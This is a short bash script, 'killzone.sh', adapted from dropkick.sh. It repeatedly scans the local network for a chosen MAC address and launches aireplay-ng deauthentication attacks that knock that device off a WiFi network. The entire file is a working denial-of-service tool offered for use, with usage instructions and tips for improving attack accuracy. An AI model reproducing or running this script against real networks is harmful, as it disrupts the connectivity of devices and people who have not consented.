#!/bin/bash
#
# killzone.sh 
#
# launches persistant deauth attack on a malicious target
# requires knowledge of target network and MAC address
# allows 3 command line argument for time between deauth attack (in seconds)
#
# usage: ./killzone.sh <target network BSSID> <target vendor MAC> <interface> <time to wait>
# ex: ./killzone.sh myNetwork evilHardware wlan0 1
#
# note: manual enumeration increases attack accuracy. beware MAC randomization
#
# adapted from dropkick.sh <http://julianoliver.com/output/log_2014-05-30_20-52> 

shopt -s nocasematch # Set shell to ignore case
shopt -s extglob # For non-interactive shell.

readonly BSSID=$1
readonly TARGET=$2
readonly INTERFACE=$3
readonly PERSIST=$4

sudo pkill ifplugd; sudo pkill wpa_supplicant; sudo pkill avahi-daemon; sudo pkill dhcpcd; sudo pkill dhclient;
sudo airmon-ng stop mon0
ifconfig $INTERFACE up

while true;
    do
    
    for HOST in $(arp-scan -I $INTERFACE --localnet | grep -o -E \
        '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
           do
               if [[ "$HOST" == "$TARGET" ]]
                   then
                    echo 'Attacking TARGET '$TARGET
                    echo 'On NETWORK BSSID '$BSSID
                    
                    sudo airmon-ng start $INTERFACE
                    sudo aireplay-ng -0 1 -a $BSSID -c $TARGET mon0 --ignore-negative-one
                    
                    sudo airmon-ng stop mon0
                    sleep $PERSIST
                   else
                    echo "no fuego ¯\_(ツ)_/¯"
               fi
           done
done
sudo airmon-ng stop mon0
